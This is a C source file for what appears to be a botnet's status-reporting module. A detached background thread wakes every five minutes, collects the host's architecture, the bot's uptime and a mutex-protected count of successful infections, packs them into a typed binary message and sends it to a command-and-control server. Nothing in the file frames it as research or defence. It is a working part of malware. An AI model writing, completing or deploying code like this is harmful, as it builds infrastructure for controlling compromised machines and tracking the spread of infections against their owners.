#include "../../include/botnet.h"
#include <stdio.h>
#include <unistd.h>
#include <pthread.h>
#include <sys/utsname.h>
#include <time.h>

#define REPORTING_INTERVAL 300 // 5 minutes

// Message type identifier for status reports
#define MSG_TYPE_STATUS_REPORT 0x01

static time_t start_time;
static int successful_infections = 0;
static pthread_mutex_t infection_counter_lock;

void *reporting_worker(void *args) {
    struct bot_status_report report;
    struct utsname uname_data;

    while (1) {
        sleep(REPORTING_INTERVAL);

        // 1. Gather data
        if (uname(&uname_data) == 0) {
            strncpy(report.arch, uname_data.machine, sizeof(report.arch) - 1);
        } else {
            strncpy(report.arch, "unknown", sizeof(report.arch) - 1);
        }
        report.uptime = time(NULL) - start_time;
        
        pthread_mutex_lock(&infection_counter_lock);
        report.infections = successful_infections;
        pthread_mutex_unlock(&infection_counter_lock);

        // 2. Construct message (1-byte type + struct)
        uint8_t message[1 + sizeof(struct bot_status_report)];
        message[0] = MSG_TYPE_STATUS_REPORT;
        memcpy(message + 1, &report, sizeof(struct bot_status_report));

        // 3. Send to C2
        printf("[*] Sending status report to C2...\n");
        c2_send((char*)message, sizeof(message));
    }

    return NULL;
}

void reporting_init() {
    pthread_t thread_id;
    start_time = time(NULL);
    pthread_mutex_init(&infection_counter_lock, NULL);

    if (pthread_create(&thread_id, NULL, reporting_worker, NULL) == 0) {
        pthread_detach(thread_id); // Run in the background
        printf("[+] Status reporting module initialized.\n");
    }
}

void increment_infection_counter() {
    pthread_mutex_lock(&infection_counter_lock);
    successful_infections++;
    pthread_mutex_unlock(&infection_counter_lock);
}
